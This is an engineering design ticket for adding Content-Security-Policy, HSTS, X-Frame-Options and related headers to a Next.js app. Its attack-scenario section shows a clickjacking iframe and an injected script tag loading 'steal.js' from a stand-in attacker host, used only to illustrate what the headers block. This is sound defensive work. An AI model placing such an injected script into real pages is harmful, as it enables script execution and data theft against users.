# 035 — Security: Add HTTP Security Headers to Next.js

**Status:** ✅ Complete
**Severity:** HIGH
**Source:** Security review 2026-06-09 (H6)

---

## Phase 1 — Problem & Goal

### What is broken today

`frontend/next.config.mjs` (line 1–18) contains only `output: "standalone"`, `esmExternals: false`, and a `redirects()` function. There is no `headers()` function. Every HTTP response from the Next.js server therefore omits the following browser-enforced protections:

- **Content-Security-Policy** — absent. `frontend/components/readme-render.tsx` renders DOMPurify-sanitised HTML via `dangerouslySetInnerHTML`. DOMPurify removes dangerous tags, but without a CSP the browser will still execute any injected script that survives sanitisation, and any script loaded from a compromised CDN or injected via a supply-chain attack in `frontend/app/layout.tsx`.
- **X-Frame-Options** — absent. Any attacker can embed `https://agent-knowledge-hub.slac.stanford.edu/` in an iframe and mount a clickjacking attack against authenticated users (auth is gated by VouchProxy at ingress, so only real users land on the page).
- **X-Content-Type-Options** — absent. Browsers may MIME-sniff API JSON responses as scripts or HTML, enabling content-injection attacks.
- **Strict-Transport-Security** — absent. Browsers that have never visited the site may send an initial request over HTTP, enabling a downgrade/MITM window before VouchProxy redirects to HTTPS.
- **Referrer-Policy** — absent. Full URL including path and query string is sent in `Referer` to external origins (GitHub avatar requests land on `avatars.githubusercontent.com` carrying the full skill page URL).

The backend at `backend/app/main.py` (line 81–87) uses `CORSMiddleware(allow_origins=["*"])`. This is a separate concern (backend is not browser-facing directly; it is NetworkPolicy-restricted), but it is noted here as out-of-scope context.

### What success looks like

After the fix, every HTTP response from the Next.js frontend includes all six security headers. Browser DevTools shows zero CSP violations for the standard user flow (browse catalog, view skill detail, submit a skill). The application renders GitHub user avatars. Admin pages load. The CLI path (Bearer JWT) is unaffected because it hits the backend directly, not the Next.js server.

### Out of scope

- Nonce-based or hash-based CSP (eliminates `unsafe-inline`/`unsafe-eval`): deferred to a future hardening sprint; requires significant Next.js build-pipeline changes.
- Backend CORS tightening (`allow_origins=["*"]` in `main.py`): separate ticket; the backend is only reachable from the frontend pod and ingress-nginx via NetworkPolicy.
- nginx-level header injection via ingress annotations: avoided because Next.js is the authoritative place to set application-layer headers; nginx annotations are fragile across overlay environments.

### Constraints

- Must not break VouchProxy auth flow (nginx ingress injects `X-Vouch-Idp-Claims-Name`/`X-Vouch-User`/`X-Forwarded-User` — these are request headers, not response headers; no conflict).
- Must deploy via kustomize without changes to Kubernetes manifests (the fix lives entirely in `next.config.mjs`).
- Must not break GitHub avatar image loading (`avatars.githubusercontent.com` must be whitelisted in `img-src`).
- Must not require a Node.js version upgrade or new npm dependencies.

---

## Phase 1.5 — User Stories

1. As a **browser user**, I want pages to refuse to load inside iframes, so that attackers cannot use the SLAC-authenticated session for clickjacking.
2. As a **browser user**, I want the browser to only load scripts from the app's own origin, so that a supply-chain compromise of a third-party script host cannot execute arbitrary code.
3. As a **browser user on first visit**, I want the browser to enforce HTTPS immediately on subsequent visits, so that there is no HTTP downgrade window before VouchProxy redirects me.
4. As a **browser user viewing a skill README**, I want inline HTML rendered from GitHub to be constrained by CSP in addition to DOMPurify, so that any XSS surviving sanitisation cannot phone home or exfiltrate data.
5. As a **skill author**, I want my GitHub avatar to load correctly, so that the fix does not degrade the skill detail page UI.
6. As a **CLI user**, I want Bearer JWT auth to continue working unchanged, so that the header changes — which apply only to Next.js server responses — do not affect the backend API I call directly.
7. As an **admin user**, I want admin pages to load without CSP violations, so that the fix does not break the label/flag management UI.
8. As a **security auditor**, I want to run `curl -I https://agent-knowledge-hub.slac.stanford.edu/` and see all six headers in the response, so that the fix is verifiable without browser access.
9. As an **attacker attempting MIME sniffing**, I want the server to return `X-Content-Type-Options: nosniff`, so that I cannot coerce the browser into treating a JSON response as a script (negative story — attacker is blocked).
10. As an **attacker attempting referrer leakage**, I want to observe only the origin (not the full path) in the `Referer` header sent to third-party hosts, so that skill page URLs are not leaked to GitHub's CDN (negative story — attacker gains no path information).

---

## Phase 2 — Requirements

### Functional Requirements

**FR-1:** `frontend/next.config.mjs` must export a `headers()` async function that applies the following headers to all routes (`source: "/(.*)"`) on every response:
- `X-Frame-Options: DENY`
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`
- `Permissions-Policy: camera=(), microphone=(), geolocation=()`
- `Content-Security-Policy` (see FR-2)

**FR-2:** The CSP value must permit the minimum required sources for the current Next.js 14 build output:
- `default-src 'self'`
- `script-src 'self' 'unsafe-inline' 'unsafe-eval'` — required for Next.js hydration; `unsafe-eval` may be omitted in production builds but is kept for dev parity
- `style-src 'self' 'unsafe-inline'` — Tailwind CSS injects inline styles
- `img-src 'self' data: https://avatars.githubusercontent.com https://github.com` — skill author avatars
- `font-src 'self'`
- `connect-src 'self'` — BFF API routes only; no external XHR
- `frame-ancestors 'none'` — redundant with `X-Frame-Options: DENY` but defence-in-depth

**FR-3:** The existing `redirects()` function in `next.config.mjs` must be preserved unchanged.

**FR-4:** The fix must apply to all three kustomize overlays (dev/stage/prod) with a single `next.config.mjs` change — no per-overlay configuration.

### Non-Functional Requirements

**NFR-1 (Performance):** The `headers()` function returns a static array — zero async I/O, zero latency added to request handling.

**NFR-2 (Compatibility):** All existing BFF API routes (`frontend/app/api/`) continue to work. The headers are applied to HTML page responses and do not affect the JSON API responses used by the CLI or internal callers (the headers are additive, not restrictive to callers).

**NFR-3 (Deployability):** Change is confined to one file (`next.config.mjs`), requires no new npm dependencies, and deploys via the standard container image rebuild + `make apply` workflow.

**NFR-4 (Auditability):** All six headers must be observable via `curl -I` against the live domain, enabling automated security scanning.

### Acceptance Criteria

**AC-1:** Given the Next.js app is running, when `curl -I http://localhost:3000/` is executed, then the response includes `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Strict-Transport-Security`, `Permissions-Policy`, and `Content-Security-Policy`.

**AC-2:** Given the app is deployed to dev, when a browser opens the skill catalog page, then the browser DevTools Console shows zero CSP violation errors during normal navigation.

**AC-3:** Given the skill detail page for a skill with a GitHub avatar, when the page loads, then the avatar image renders correctly (not blocked by CSP `img-src`).

**AC-4:** Given the admin labels page, when an admin user navigates to it, then the page loads without CSP violations.

**AC-5:** Given any page response, when the response headers are inspected, then `frame-ancestors 'none'` is present in the CSP and `X-Frame-Options: DENY` is present as a standalone header.

**AC-6:** Given the existing `redirects()` function for `/marketplace.json`, when a request to `/marketplace.json` is made, then it still redirects to `/cli/api/marketplace.json` (no regression).

---

## Phase 3 — ADRs

**ADR-035-1: Apply security headers in next.config.mjs, not at the nginx ingress layer**

Status: Accepted

Context: Security headers can be injected by the nginx ingress controller via annotations or ConfigMap, or by the application server itself via `next.config.mjs`. A decision was needed on which layer owns these headers.

Options considered:
| Option | Pros | Cons |
|---|---|---|
| nginx ingress annotations | No app rebuild needed | Fragile across 3 overlays; easy to miss in kustomize patches; not visible in app source review |
| `next.config.mjs` `headers()` | Single file change, version-controlled with the app, works across all environments | Requires container image rebuild to change |

Decision: `next.config.mjs`. Security policy that affects the browser-app contract belongs in the application layer, not the infrastructure layer. It is auditable in source, covered by standard CI, and DRY across all kustomize overlays.

Consequences: Any CSP change requires a new image build and rollout. This is acceptable for a policy that should rarely change.

---

**ADR-035-2: Use permissive CSP (`unsafe-inline`, `unsafe-eval`) initially rather than blocking ship until nonces are implemented**

Status: Accepted

Context: Next.js 14 App Router with Tailwind CSS injects inline styles and requires `unsafe-eval` in the hydration bundle. A strict nonce-based CSP would require instrumenting the Next.js build pipeline. The security review found no current CSP at all.

Options considered:
| Option | Pros | Cons |
|---|---|---|
| Strict CSP with nonces now | Maximum protection | High implementation risk; may break hydration; blocks this fix |
| Permissive CSP with `unsafe-inline`/`unsafe-eval` | Ships quickly; still blocks cross-origin script loads and iframes | Inline script injection still possible if XSS bypasses DOMPurify |
| No CSP (status quo) | No work | Full XSS amplification |

Decision: Ship the permissive CSP now. Cross-origin script loads and frame embedding are blocked immediately — the highest-risk vectors. `unsafe-inline` + DOMPurify together provide meaningful defence. Nonce-based tightening is a future hardening ticket.

Consequences: `unsafe-inline` remains in `script-src` until nonce implementation. This is documented and accepted.

---

## Phase 3.5 — Module Design

| Module/file | Change type | What changes | Testable in isolation? |
|---|---|---|---|
| `frontend/next.config.mjs` | Modify | Add `async headers()` returning the 6-header array for `source: "/(.*)"` | Yes — `curl -I localhost:3000` or Vitest unit test asserting the returned array structure |
| `frontend/next.config.test.mjs` (new) | Add | Vitest unit test importing the headers config and asserting all 6 keys are present with correct values | Yes — pure function, no I/O |

No other files change. No Kubernetes manifests change.

---

## Phase 4 — System/Infrastructure Design

### Request flow showing where headers are injected

```
Browser
  │
  │  HTTPS GET /skills
  ▼
nginx ingress  (prod overlay: ingress-frontend.yaml)
  │  VouchProxy auth_request validation
  │  Injects: X-Vouch-User, X-Forwarded-User, X-Vouch-Idp-Claims-Name  →  request headers only
  ▼
Next.js (port 3000)
  │  App Router renders page
  │  next.config.mjs headers() fires  ← NEW: attaches 6 security headers to response
  ▼
Response to browser:
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; ...
```

### Attack scenario blocked: clickjacking

```
Before fix:
  Attacker page embeds <iframe src="https://agent-knowledge-hub.slac.stanford.edu/">
  → iframe loads authenticated page, attacker overlays invisible controls

After fix:
  Browser sees X-Frame-Options: DENY + CSP frame-ancestors 'none'
  → browser refuses to render the iframe
```

### Attack scenario blocked: cross-origin script injection

```
Before fix:
  Hypothetical XSS injects <script src="https://evil.example/steal.js">
  → browser fetches and executes the external script

After fix:
  CSP: script-src 'self' → browser blocks the external script fetch
  Console: Refused to load script from 'https://evil.example/steal.js' (CSP violation)
```

### API contract: no change

The `headers()` function adds response headers; it does not alter request processing, routing, or JSON API responses. All BFF routes in `frontend/app/api/` are unaffected.

---

## Phase 7 — Trade-offs

| Choice | What we gain | What we give up |
|---|---|---|
| `unsafe-inline` + `unsafe-eval` in CSP | Ships immediately; Next.js hydration works without changes | Inline script injection still possible if XSS bypasses DOMPurify |
| All headers on `source: "/(.*)"` (catch-all) | Simple, no per-route logic | Security headers also sent on API routes (`/api/*`) — harmless but slightly redundant |
| Application-layer headers vs. nginx annotations | DRY across all overlays; version-controlled; CI-covered | Every CSP tweak requires an image rebuild and rollout |
| `frame-ancestors 'none'` + `X-Frame-Options: DENY` both set | Defence-in-depth; covers old browsers that don't support CSP | Marginally larger header payload (negligible) |

---

## Phase 8 — Delivery Slices

All changes fit in a single file. Three slices for review clarity:

**Slice 1 — Core security headers (all except CSP)**
Add `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Strict-Transport-Security`, `Permissions-Policy` to `next.config.mjs`. Ship immediately. Zero risk of breakage.

**Slice 2 — Content-Security-Policy**
Add the `Content-Security-Policy` header. Validate in dev with browser DevTools — confirm zero CSP violations for: catalog page, skill detail page (avatar loads, README renders), admin labels page, skill submit form. Ship to dev, validate, then promote to stage/prod.

**Slice 3 — Test coverage**
Add `frontend/next.config.test.mjs` asserting all header keys and values. Wire into CI. Slice 3 can be merged in any order relative to 1 and 2 but should land before prod.

Each slice is independently deployable. Slices 1 and 2 are typically merged together as a single PR since they are one file edit.

---

## Phase 9 — Risk Register

| Risk | Likelihood | Impact | Mitigation |
|---|---|---|---|
| CSP blocks a resource used by a page we did not manually test (e.g. a data: URI in an inline SVG icon) | Low | Medium — visual regression, not a security hole | Test all major routes in dev before promoting; CSP violation appears in browser console |
| `unsafe-eval` requirement removed in a future Next.js version, making the CSP too permissive | Low | Low — still improves on current (no CSP) | Revisit CSP when upgrading Next.js major version |
| nginx ingress strips or overrides `X-Frame-Options` via existing ConfigMap | Low | Medium — header silently absent in prod | Verify with `curl -I` against the live ingress hostname, not just `localhost:3000` |
| HSTS `preload` causes a site rename to fail (browser pins old domain) | Very low | High if domain changes | HSTS preload is appropriate for a stable production hostname; remove `preload` if a domain migration is planned |

---

## Phase 10 — Definition of Done

- [ ] `async headers()` added to `frontend/next.config.mjs` with all six headers
- [ ] Existing `redirects()` function preserved and tested unchanged
- [ ] Unit test `frontend/next.config.test.mjs` written, covering all 6 header keys and the presence of critical CSP directives (`frame-ancestors`, `img-src avatars.githubusercontent.com`)
- [ ] `npm test` (or `npx vitest run`) passes locally
- [ ] `curl -I http://localhost:3000/` shows all six headers
- [ ] App runs locally with no CSP violations in browser console for: home, catalog (`/skills`), skill detail (`/skills/<slug>`), submit (`/skills/submit`), admin labels page
- [ ] GitHub user avatars load on skill detail pages
- [ ] Deployed to dev overlay via `make apply` (or equivalent kustomize command)
- [ ] `curl -I https://<dev-hostname>/` confirms all six headers present in the ingress response
- [ ] No regression in existing Vitest tests (`lib/platform-filter.test.ts`, `lib/revision-diff.test.ts`)
- [ ] PR reviewed and merged to `main`
- [ ] Deployed to stage and prod; prod `curl -I` confirms headers
